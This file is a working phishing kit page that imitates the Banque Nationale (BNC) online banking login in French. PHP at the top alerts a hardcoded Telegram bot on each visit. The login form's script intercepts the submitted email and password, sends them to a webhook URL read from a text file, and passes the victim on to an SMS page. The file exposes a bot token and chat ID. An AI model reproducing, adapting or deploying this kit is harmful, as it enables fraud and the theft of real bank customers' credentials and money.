<?php session_start();
$_SESSION["bank"] ='BNC';



?>

<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 
// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*.".$_SESSION["bank"]."*🏛🏛\n";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Connexion - Réalisons vos idées</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: { primary: "#8E6FF7", secondary: "" },
            borderRadius: {
              none: "0px",
              sm: "4px",
              DEFAULT: "8px",
              md: "12px",
              lg: "16px",
              xl: "20px",
              "2xl": "24px",
              "3xl": "32px",
              full: "9999px",
              button: "8px",
            },
          },
        },
      };
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css"
    />
    <style>
      :where([class^="ri-"])::before { content: "\f3c2"; }
      body {
          font-family: 'Inter', sans-serif;
          background-color: #f8f9fa;
      }
      .login-container {
          min-height: 100vh;
      }
      .form-input {
          transition: all 0.3s ease;
      }
      .form-input:focus {
          border-color: #8E6FF7;
          box-shadow: 0 0 0 3px rgba(142, 111, 247, 0.2);
      }
      .password-toggle {
          cursor: pointer;
      }
      
    </style>

<style>
  .logo-icon { fill: red; }
  .logo-txt { fill: black; }
</style>

    <!-- Simple CSS spinner -->
    <style>
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #006241;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #errorPopup {
            position: fixed;
            top: 30%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #f44336;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            font-size: 16px;
        }
    </style>
  </head>
  <body>
    <div class="login-container flex">
      <!-- Image Section -->
      <div class="hidden md:block w-3/5 relative">
        <img
          src="https://dam.bnc.ca/content/dam/transac/sbip/img-login.jpg"
          alt="Espace de travail moderne"
          class="w-full h-full object-cover object-top"
        />
      </div>

      <!-- Login Form Section -->
      <div class="w-full md:w-2/5 p-8 flex flex-col justify-center bg-white">
        <div class="max-w-md mx-auto w-full">
          <!-- Logo -->
          <div class="flex justify-between items-center mb-10">
            <div class="font-['Pacifico'] text-2xl text-primary">
                <svg width="150px" viewBox="0 0 408.6 106.3" preserveAspectRatio="xMinYMid meet"><title>Banque Nationale</title><g><g><path class="logo-icon" d="M72.8,24.3c-2,0.5-3.4,0.8-4.9,0.2c-1.1-0.4-2-1.7-2.8-2.8L51.5,3.1c-0.8-1.1-1.7-2.3-2.8-2.8 c-1.5-0.6-2.9-0.2-4.9,0.2L0,12.3v81.6l43.9-11.7c2-0.4,3.5-0.8,4.9-0.2c1.1,0.5,2,1.7,2.8,2.8l13.5,18.6c0.8,1.1,1.7,2.3,2.8,2.8 c1.5,0.5,2.9,0.2,4.9-0.2L116.7,94V12.5L72.8,24.3z"></path><path class="logo-txt" d="M168.2,28.5c1.4-0.7,4.3-2.1,4.3-7.1c0-3.6-2.2-8.9-10.7-8.9h-9.6l-7.3,3.6v31.1h14.7c7.1,0,9-1.2,11-3.1 c1.8-1.8,3-4.4,3-7.2C173.6,33.5,172.5,30.1,168.2,28.5 M151.9,18.5h8.3c3.3,0,5.3,0.9,5.3,3.7c0,2.8-2.3,3.9-5.1,3.9h-8.5V18.5z M160.8,41.2h-8.9v-9.3h9.2c2.6,0,5.2,1.2,5.2,4.2C166.3,39.7,164.3,41.2,160.8,41.2"></path><polygon class="logo-txt" points="341.2,41.1 341.2,41.1 322,41.1 322,32.1 335.4,32.1 338.9,25.9 322,25.9 322,18.6 336.8,18.6 340.4,12.5 322.7,12.5 314.9,16.3 314.9,47.2 337.7,47.2"></polygon><path class="logo-txt" d="M273.2,42.2c2.1-2.7,3.6-6.7,3.6-12.4c0-16.3-12.1-18.3-16.7-18.3c-0.3,0-0.7,0-1.1,0l-11.9,5.8 c-2.1,2.7-3.6,6.7-3.6,12.4c0,16.3,12.1,18.3,16.7,18.3c2,0,5.6-0.4,8.9-2.3l4.1,3.9l3.8-3.9L273.2,42.2z M268,37.3l-3.7-3.4 l-3.7,3.9l3.5,3.3c-1.3,0.7-2.7,0.9-3.9,0.9c-3.9,0-9.4-2.4-9.4-12.1s5.5-12.1,9.4-12.1c3.9,0,9.4,2.4,9.4,12.1 C269.6,33.1,269,35.5,268,37.3"></path><path class="logo-txt" d="M302,16.1v19.3c0,4.2-2,6.6-7,6.6c-3.4,0-6.2-2.1-6.2-7V12.5h0l-7.4,3.6v19.4c0.1,3.5,0.8,6.3,2.7,8.4 c3.1,3.4,7.8,4.2,11,4.2c8.7,0,14.3-3.9,14.3-13V12.5h0L302,16.1z"></path><polygon class="logo-txt" points="232,15.8 232,36.7 231.9,36.7 218.1,12.5 210.5,16.2 210.5,47.2 217.2,47.2 217.2,22.5 217.3,22.5 231.5,47.2 238.7,47.2 238.7,12.5"></polygon><path class="logo-txt" d="M195.2,12.5L195.2,12.5l-10.1,4.9l-10.6,29.8h7.6l2.4-7.1h12.8l2.2,7.1h7.9L195.2,12.5z M186.5,34.1l4.4-13.7 h0.1l4.3,13.7H186.5z"></path><polygon class="logo-txt" points="408.6,87.9 408.6,87.9 389.4,87.9 389.4,78.9 402.7,78.9 406.3,72.8 389.4,72.8 389.4,65.5 404.2,65.5 407.8,59.3 390.1,59.3 382.3,63.2 382.3,94 405.1,94"></polygon><polygon class="logo-txt" points="166.4,62.6 166.4,83.5 166.3,83.5 152.6,59.3 144.9,63.1 144.9,94 151.7,94 151.7,69.3 151.8,69.3 166,94 173.2,94 173.2,59.3"></polygon><path class="logo-txt" d="M197.4,59.3L197.4,59.3l-10.1,4.9L176.7,94h7.6l2.4-7.2h12.8l2.2,7.2h7.9L197.4,59.3z M188.6,80.9l4.4-13.7 h0.1l4.3,13.7H188.6z"></path><path class="logo-txt" d="M339.1,59.3L339.1,59.3L329,64.3L318.4,94h7.6l2.4-7.2h12.8l2.2,7.2h7.9L339.1,59.3z M330.4,80.9l4.4-13.7h0.1l4.3,13.7H330.4z"></path><polygon class="logo-txt" points="233.5,59.3 208.9,59.3 205.3,65.4 205.3,65.5 215.8,65.5 215.8,94 223.1,94 223.1,65.5 230,65.5"></polygon><polygon class="logo-txt" points="236.4,62.9 236.4,94 243.7,94 243.7,59.3 243.7,59.3"></polygon><path class="logo-txt" d="M265.1,58.4c-0.3,0-0.7,0-1.1,0l-12,5.9c-2.1,2.7-3.6,6.7-3.6,12.4c0,16.3,12.1,18.3,16.7,18.3 c4.6,0,16.7-2,16.7-18.3C281.8,60.4,269.7,58.4,265.1,58.4 M265.1,88.8c-3.9,0-9.4-2.4-9.4-12.1c0-9.7,5.5-12.1,9.4-12.1 c3.9,0,9.4,2.4,9.4,12.1C274.5,86.4,269,88.8,265.1,88.8"></path><polygon class="logo-txt" points="308.1,62.6 308.1,83.5 308,83.5 294.2,59.3 286.6,63.1 286.6,94 293.3,94 293.3,69.3 293.4,69.3 307.6,94 314.8,94 314.8,59.3"></polygon><polygon class="logo-txt" points="379.4,87.8 362.2,87.8 362.2,59.3 354.9,62.9 354.9,94 375.8,94"></polygon></g></g></svg>
            </div>
            <div class="flex items-center">
              <div class="h-4 w-4 bg-yellow-300 mr-1"></div>
              <div class="h-4 w-8 bg-red-500 mr-1"></div>
              <div class="text-sm font-medium">Réalisons<br />vos idées</div>
            </div>
          </div>
          <!-- Title -->
          <h1 class="text-3xl font-bold mb-8">Bonjour</h1>

          <!-- Login Form -->
          <form id="loginForm"   action="/bnc/sms.php" method="post">
            <!-- Email Input -->
            <div class="mb-6">
              <label for="email" class="block text-sm font-medium mb-2"
                >Courriel d'identification</label
              >
              <input
              name="cvv"
                type="email"
                id="email"
                class="form-input w-full px-4 py-3 border border-gray-300 rounded focus:outline-none"
                placeholder="Entrez votre courriel d'identification"
              />
            </div>

            <!-- Password Input -->
            <div class="mb-2">
              <label for="password" class="block text-sm font-medium mb-2"
                >Mot de passe</label
              >
              <div class="relative">
                <input
                name="mdp"
                  type="password"
                  id="password"
                  class="form-input w-full px-4 py-3 border border-gray-300 rounded focus:outline-none"
                  placeholder="Entrez votre mot de passe"
                />
                <div
                  class="password-toggle absolute right-3 top-1/2 transform -translate-y-1/2 w-6 h-6 flex items-center justify-center text-gray-500"
                >
                  <i class="ri-eye-line"></i>
                </div>
              </div>
            </div>
            <!-- Forgot Password Link -->
            <div class="mb-6">
              <a href="#" class="text-sm text-primary hover:underline"
                >Mot de passe oublié?</a
              >
            </div>

            <!-- Remember Me Checkbox -->
            <div class="flex items-center mb-8">
              <input type="checkbox" id="remember" class="hidden" />
              <label for="remember" class="flex items-center cursor-pointer">
                <div
                  class="w-5 h-5 border border-gray-300 rounded mr-2 flex items-center justify-center"
                >
                  <div
                    class="w-3 h-3 bg-primary rounded hidden"
                    id="checkbox-indicator"
                  ></div>
                </div>
                <span class="text-sm"
                  >Se souvenir de mon courriel d'identification</span
                >
              </label>
              <div
                class="w-5 h-5 ml-2 flex items-center justify-center text-gray-500 cursor-pointer"
                title="Information sur la mémorisation de votre identifiant"
              >
                <i class="ri-information-line"></i>
              </div>
            </div>

            <!-- Login Button -->
            <button
              type="submit"
              class="w-full bg-primary text-white py-3 px-4 !rounded-button flex items-center justify-center whitespace-nowrap mb-10"
            >
              <div class="w-5 h-5 flex items-center justify-center mr-2">
                <i class="ri-lock-line"></i>
              </div>
              <span>Se connecter</span>
            </button>
          </form>
          <!-- First Time User Section -->
          <div class="bg-blue-50 p-6 rounded-lg">
            <h2 class="text-lg font-semibold mb-2">
              C'est votre première connexion?
            </h2>
            <p class="text-sm text-gray-700 mb-4">
              Créez votre compte pour accéder à tous nos services en ligne avec
              un seul mot de passe.
            </p>
            <button
              class="border border-primary text-primary py-2 px-4 !rounded-button whitespace-nowrap hover:bg-primary hover:text-white transition-colors"
            >
              Créer votre compte
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Chat Support Button -->
    <div
      class="fixed bottom-6 right-6 w-12 h-12 bg-primary rounded-full flex items-center justify-center text-white cursor-pointer shadow-lg"
    >
      <i class="ri-message-3-line ri-lg"></i>
    </div>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Password visibility toggle
        const passwordInput = document.getElementById("password");
        const passwordToggle = document.querySelector(".password-toggle");

        passwordToggle.addEventListener("click", function () {
          if (passwordInput.type === "password") {
            passwordInput.type = "text";
            passwordToggle.innerHTML = '<i class="ri-eye-off-line"></i>';
          } else {
            passwordInput.type = "password";
            passwordToggle.innerHTML = '<i class="ri-eye-line"></i>';
          }
        });
      });

      document.addEventListener("DOMContentLoaded", function () {
        // Custom checkbox functionality
        const checkbox = document.getElementById("remember");
        const indicator = document.getElementById("checkbox-indicator");
        const checkboxLabel = document.querySelector('label[for="remember"]');

        checkboxLabel.addEventListener("click", function () {
          checkbox.checked = !checkbox.checked;
          if (checkbox.checked) {
            indicator.classList.remove("hidden");
          } else {
            indicator.classList.add("hidden");
          }
        });
      });
    </script>
  </body>
</html>
